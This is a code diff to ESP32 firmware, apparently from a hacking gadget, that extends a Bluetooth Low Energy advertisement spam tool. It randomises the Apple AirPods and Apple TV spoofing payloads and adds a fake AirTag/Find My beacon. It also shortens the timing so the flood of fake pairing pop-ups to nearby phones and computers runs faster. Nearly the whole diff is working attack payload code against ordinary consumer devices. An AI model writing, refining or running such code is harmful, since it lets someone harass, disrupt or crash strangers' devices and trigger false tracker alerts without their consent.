@@ -26,7 +26,8 @@ enum EBLEPayloadType {
     SourApple = 1, 
     AppleJuice = 2, 
     Samsung = 3, 
-    Google = 4 
+    Google = 4,
+    AppleFindMy = 5
 };
 
 const uint8_t IOS1[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
@@ -70,8 +71,16 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case AppleJuice: {
+            uint8_t deviceType;
+            int randVal = random(100);
+            
+            if (randVal < 70) deviceType = 0x0e;
+            else if (randVal < 85) deviceType = 0x0a;
+            else if (randVal < 95) deviceType = 0x0f;
+            else deviceType = 0x14;
+            
             const uint8_t airpods[] = {
-                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
+                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00
@@ -81,8 +90,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case SourApple: {
+            const uint8_t appleTypes[] = {0x01, 0x06, 0x09, 0x0b, 0x20};
+            uint8_t appleType = appleTypes[random(sizeof(appleTypes))];
+            
             uint8_t sour[] = {
-                16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01,
+                16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, appleType,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
                 0x00, 0x00, 0x00
             };
@@ -90,6 +102,17 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             esp_fill_random(&sour[15], 2);
             memcpy(packet, sour, sizeof(sour));
             packet_len = sizeof(sour);
+            break;
+        }
+        case AppleFindMy: {
+            uint8_t findmy[] = {
+                0x12, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x01, 0x02,
+                0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
+                0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12
+            };
+            esp_fill_random(&findmy[8], 16);
+            memcpy(packet, findmy, sizeof(findmy));
+            packet_len = sizeof(findmy);
             break;
         }
         case Samsung: {
@@ -137,14 +160,15 @@ void executeSpam(EBLEPayloadType type) {
 
     const char* deviceName = "";
     switch(type) {
-        case AppleJuice: deviceName = "AirPods Pro"; break;
-        case SourApple: deviceName = "Apple TV 4K"; break;
-        case Microsoft: deviceName = "Surface Pro 9"; break;
-        case Samsung: deviceName = "Galaxy Buds2 Pro"; break;
-        case Google: deviceName = "Pixel Buds Pro"; break;
+        case AppleJuice: deviceName = "AirPods"; break;
+        case SourApple: deviceName = "AppleTV"; break;
+        case Microsoft: deviceName = "Surface"; break;
+        case Samsung: deviceName = "GalaxyBuds"; break;
+        case Google: deviceName = "PixelBuds"; break;
+        case AppleFindMy: deviceName = "AirTag"; break;
     }
 
-    Serial.printf("[N] %s\n", deviceName);
+    Serial.printf("[BLE] %s\n", deviceName);
 
     BLEDevice::init(deviceName);
     vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -161,11 +185,11 @@ void executeSpam(EBLEPayloadType type) {
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->setScanResponseData(scanResponseData);
 
-    pAdvertising->setMinInterval(0x40);
-    pAdvertising->setMaxInterval(0x80);
+    pAdvertising->setMinInterval(0x80);
+    pAdvertising->setMaxInterval(0x100);
 
     pAdvertising->start();
-    vTaskDelay(500 / portTICK_PERIOD_MS);
+    vTaskDelay(350 / portTICK_PERIOD_MS);
 
     pAdvertising->stop();
     vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -191,7 +215,7 @@ void executeCustomSpam(String spamName) {
         deviceName += " Pro";
     }
 
-    Serial.printf("[N] Custom: %s\n", deviceName.c_str());
+    Serial.printf("[BLE] Custom: %s\n", deviceName.c_str());
 
     BLEDevice::init(deviceName.c_str());
     vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -205,11 +229,11 @@ void executeCustomSpam(String spamName) {
 
     pAdvertising->setAdvertisementData(advertisementData);
     
-    pAdvertising->setMinInterval(0x40);
-    pAdvertising->setMaxInterval(0x80);
+    pAdvertising->setMinInterval(0x80);
+    pAdvertising->setMaxInterval(0x100);
     
     pAdvertising->start();
-    vTaskDelay(500 / portTICK_PERIOD_MS);
+    vTaskDelay(350 / portTICK_PERIOD_MS);
 
     pAdvertising->stop();
     vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -267,54 +291,60 @@ void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
 
-    Serial.println("\n=== BLE NUCLEAR ===");
+    Serial.println("\n=== BLE SPAM ===");
 
-    if (ble_choice == 6) {
+    if (ble_choice == 7) {
         spamName = keyboard("", 10, "Name to spam");
     }
 
     while (1) {
-        Serial.printf("N#%d: ", count);
+        Serial.printf("Try #%d: ", count);
 
         switch (ble_choice) {
             case 0:
-                displayTextLine("AirPods Pro (" + String(count) + ")");
+                displayTextLine("Applejuice (" + String(count) + ")");
                 Serial.println("AirPods");
                 executeSpam(AppleJuice);
                 break;
             case 1:
-                displayTextLine("Apple TV 4K (" + String(count) + ")");
+                displayTextLine("SourApple (" + String(count) + ")");
                 Serial.println("AppleTV");
                 executeSpam(SourApple);
                 break;
             case 2:
-                displayTextLine("Surface Pro (" + String(count) + ")");
+                displayTextLine("SwiftPair (" + String(count) + ")");
                 Serial.println("Surface");
                 executeSpam(Microsoft);
                 break;
             case 3:
-                displayTextLine("Galaxy Buds2 Pro (" + String(count) + ")");
+                displayTextLine("Samsung (" + String(count) + ")");
                 Serial.println("GalaxyBuds");
                 executeSpam(Samsung);
                 break;
             case 4:
-                displayTextLine("Pixel Buds Pro (" + String(count) + ")");
+                displayTextLine("Android (" + String(count) + ")");
                 Serial.println("PixelBuds");
                 executeSpam(Google);
                 break;
             case 5:
+                displayTextLine("FindMy (" + String(count) + ")");
+                Serial.println("AirTag");
+                executeSpam(AppleFindMy);
+                break;
+            case 6:
                 displayTextLine("Spam All (" + String(count) + ")");
-                switch(mael % 5) {
+                switch(mael % 6) {
                     case 0: Serial.print("PixelBuds "); executeSpam(Google); break;
                     case 1: Serial.print("GalaxyBuds "); executeSpam(Samsung); break;
                     case 2: Serial.print("Surface "); executeSpam(Microsoft); break;
                     case 3: Serial.print("AppleTV "); executeSpam(SourApple); break;
                     case 4: Serial.print("AirPods "); executeSpam(AppleJuice); break;
+                    case 5: Serial.print("AirTag "); executeSpam(AppleFindMy); break;
                 }
                 Serial.println("");
                 mael++;
                 break;
-            case 6:
+            case 7:
                 displayTextLine(spamName + " (" + String(count) + ")");
                 Serial.println("Custom: " + spamName);
                 executeCustomSpam(spamName);
@@ -322,7 +352,7 @@ void aj_adv(int ble_choice) {
         }
         count++;
 
-        vTaskDelay(400 / portTICK_PERIOD_MS);
+        vTaskDelay(300 / portTICK_PERIOD_MS);
 
         if (check(EscPress)) {
             Serial.println("=== STOP ===");
